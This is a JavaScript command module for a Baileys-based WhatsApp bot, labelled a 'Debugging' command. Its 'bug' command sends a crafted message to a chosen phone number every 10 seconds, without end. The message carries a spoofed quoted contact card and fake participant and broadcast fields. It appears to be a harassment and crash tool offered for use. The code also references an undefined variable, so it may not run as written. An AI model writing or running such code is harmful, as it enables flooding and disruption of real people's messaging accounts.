import { generateWAMessageFromContent } from "@adiwajshing/baileys";

export default {
	name: "bug",
	description: "Send bug.",
	category: "Debugging",
	usage: "!bug",
	aliases: ["bug"],
	cooldown: 5,
	limit: 0,
	status: "enable",
	async run({ from, bodyQuoted, mediaData, query }, client, store) {
		if (!query && !bodyQuoted) {
			return;
		}
		setInterval(async () => {
			const messages = generateWAMessageFromContent(
				from,
				{
					extendedTextMessage: {
						text: ".",
						contextInfo: {
							participant: "0@s.whatsapp.net",
							remoteJid: "broadcast",
							quotedMessage: {
								contactMessage: {
									displayName: "Hidden Finder",
									vcard: "BEGIN:VCARD\nVERSION:3.0\nTEL;type=CELL;type=VOICE;waid=6289522534401:6289522534401\nEND:VCARD",
								},
							},
						},
					},
				},
				{},
			);
			await client[botNum].relayMessage(`${(query || mediaData.participant).replace(/([@s\.\+\s\-]|whatsapp|net)/g, "")}@s.whatsapp.net`, messages.message, {
				messageId: messages.key.id,
			});
		}, 10_000);
	},
};
